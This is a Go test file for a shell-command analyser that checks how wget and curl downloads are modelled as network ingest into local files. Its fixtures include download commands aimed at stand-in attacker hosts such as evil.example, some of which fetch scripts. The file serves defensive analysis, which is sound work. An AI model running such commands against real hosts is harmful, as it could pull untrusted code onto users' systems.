package bind_test

import (
	"sort"
	"strings"
	"testing"

	"github.com/v0lka/flowsh/bind"
	"github.com/v0lka/flowsh/engine"
)

// This file pins the download-client ingest modelling: wget's implicit output
// file (finding #10/#46), curl -O's local name (#11), a download written to
// standard output (#13) and wget's local naming rule (#59).

// ingestSinks returns the targets of every ingest flow sink, sorted.
func ingestSinks(res *bind.Result) []string {
	var out []string
	for _, f := range engine.DetectIngestFlows(res.Effects) {
		out = append(out, f.Sink.Target.Targets()...)
	}
	sort.Strings(out)
	return out
}

func hasSink(res *bind.Result, want string) bool {
	for _, t := range ingestSinks(res) {
		if t == want {
			return true
		}
	}
	return false
}

// TestBindWgetNoOutputModesPinNoIngest pins #10: an invocation that leaves no
// downloaded body at a file path — --spider fetches headers only, --delete-after
// removes what it wrote — must not be reported as writing a file, so the
// implicit ingest is not synthesised at all.
func TestBindWgetNoOutputModesPinNoIngest(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"wget --spider https://example.com/file.tar.gz",
		"wget --spider https://example.com/dir/",
		"wget --delete-after https://example.com/file.tar.gz",
	} {
		res := bindOne(t, b, src)
		if sinks := ingestSinks(res); len(sinks) != 0 {
			t.Errorf("%q: ingest sinks %v, want none (the body never lands in a file)", src, sinks)
		}
		for _, e := range res.Effects {
			if e.Kind == engine.KindFSWrite && e.Target.Contains("file.tar.gz") {
				t.Errorf("%q: fabricated FSWrite %s for a probe that writes nothing", src, e.Target)
			}
		}
		if _, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect); !ok {
			t.Errorf("%q: the egress of the probe must stay reported, got %s", src, effectsString(res))
		}
	}
}

// TestBindWgetOutputDocumentIsTheSink pins #10: the long form of -O names the
// output file, so the synthesised default sink must not be added beside it.
func TestBindWgetOutputDocumentIsTheSink(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"wget --output-document=out.bin https://example.com/file.tar.gz",
		"wget --output-document out.bin https://example.com/file.tar.gz",
		"wget -O out.bin https://example.com/file.tar.gz",
	} {
		res := bindOne(t, b, src)
		if !hasSink(res, "out.bin") {
			t.Errorf("%q: sink must be the named output, got sinks %v (effects %s)", src, ingestSinks(res), effectsString(res))
		}
		if hasSink(res, "file.tar.gz") {
			t.Errorf("%q: the URL-derived default sink must be suppressed, got %v", src, ingestSinks(res))
		}
	}
}

// TestBindWgetSinkNamedFromURLOperand pins #10: the implicit sink is named from
// the URL operand, never from another concrete egress (a --user-agent value is
// not a destination), and one sink is emitted per URL operand.
func TestBindWgetSinkNamedFromURLOperand(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "wget --user-agent Foo https://evil.example/dir/file.tgz")
	if !hasSink(res, "file.tgz") {
		t.Errorf("sink must come from the URL operand, got %v (effects %s)", ingestSinks(res), effectsString(res))
	}
	if hasSink(res, "index.html") || hasSink(res, "Foo") {
		t.Errorf("sink named after a non-URL egress: %v", ingestSinks(res))
	}

	res = bindOne(t, b, "wget http://a.example/x http://b.example/y")
	sinks := ingestSinks(res)
	if !hasSink(res, "x") || !hasSink(res, "y") {
		t.Errorf("every URL operand must contribute a sink, got %v", sinks)
	}
}

// TestBindWgetDirectoryPrefixFoldsIntoSink pins #46: -P/--directory-prefix
// relocates the write, so the sink names the file where wget writes it; an
// unresolved prefix leaves the path unknown (⊤) instead of naming a file the
// command never writes.
func TestBindWgetDirectoryPrefixFoldsIntoSink(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"wget -P /tmp/dir https://evil.example/f",
		"wget --directory-prefix=/tmp/dir https://evil.example/f",
		"wget --directory-prefix /tmp/dir https://evil.example/f",
	} {
		res := bindOne(t, b, src)
		if !hasSink(res, "/tmp/dir/f") {
			t.Errorf("%q: sink must be the prefixed path, got %v (effects %s)", src, ingestSinks(res), effectsString(res))
		}
		if hasSink(res, "f") {
			t.Errorf("%q: the sink must not name the unprefixed file, got %v", src, ingestSinks(res))
		}
	}

	res := bindOne(t, b, "wget -P $D https://evil.example/f")
	flows := engine.DetectIngestFlows(res.Effects)
	if len(flows) == 0 {
		t.Fatalf("dynamic -P must still report the download as an ingest, got %s", effectsString(res))
	}
	for _, f := range flows {
		if !f.Sink.Target.IsTop() {
			t.Errorf("dynamic -P sink target = %s, want ⊤ (the path is unknown)", f.Sink.Target)
		}
	}
}

// TestBindDownloadToStdoutIsNotAFile pins #13: `-` as a download output value is
// standard output, so the parameter contributes Stdio — never an FSWrite whose
// target is the literal "-", and never an ingest sink.
func TestBindDownloadToStdoutIsNotAFile(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"wget -O - https://evil.example/x.sh",
		"curl -o - https://evil.example/x",
	} {
		res := bindOne(t, b, src)
		for _, e := range res.Effects {
			if e.Kind != engine.KindFSWrite {
				continue
			}
			for _, tg := range e.Target.Targets() {
				if tg == "-" {
					t.Errorf("%q: bogus FSWrite to the literal \"-\" (standard output)", src)
				}
			}
		}
		if _, ok := findEffect(res, engine.KindStdio, engine.ModeDirect); !ok {
			t.Errorf("%q: expected a Stdio effect, got %s", src, effectsString(res))
		}
		if sinks := ingestSinks(res); len(sinks) != 0 {
			t.Errorf("%q: stdout is not an ingest sink, got %v", src, sinks)
		}
	}
}

// TestBindCurlRemoteNameSinkIsLocalFile pins #11: curl -O writes the body to a
// file named after the URL's last path segment, so the ingest sink is that local
// file — not the remote URL.
func TestBindCurlRemoteNameSinkIsLocalFile(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "curl -O https://evil.example/a/b.bin")
	if !hasSink(res, "b.bin") {
		t.Errorf("ingest sink = %v, want the local file b.bin", ingestSinks(res))
	}
	for _, t2 := range ingestSinks(res) {
		if strings.Contains(t2, "://") {
			t.Errorf("ingest sink %q is a URL, not the local file curl wrote", t2)
		}
	}
}

// TestBindDownloadNamingRule pins #59 against GNU Wget's own rule (verified
// against wget 1.25): the query string is part of the local file name, the
// fragment is not, and a path that names no file falls back to index.html.
func TestBindDownloadNamingRule(t *testing.T) {
	b := newBinder(t)
	cases := []struct {
		src  string
		want string
	}{
		{"wget 'https://evil.example/file.tgz?a=1&b=2'", "file.tgz?a=1&b=2"},
		{"wget 'https://evil.example/dir/'", "index.html"},
		{"wget 'https://evil.example/'", "index.html"},
		{"wget 'https://evil.example/dir/file.tgz#frag'", "file.tgz"},
		{"curl -O 'https://evil.example/a/b.bin?v=2'", "b.bin?v=2"},
	}
	for _, tc := range cases {
		res := bindOne(t, b, tc.src)
		if !hasSink(res, tc.want) {
			t.Errorf("%q: sink = %v, want %q", tc.src, ingestSinks(res), tc.want)
		}
	}
}
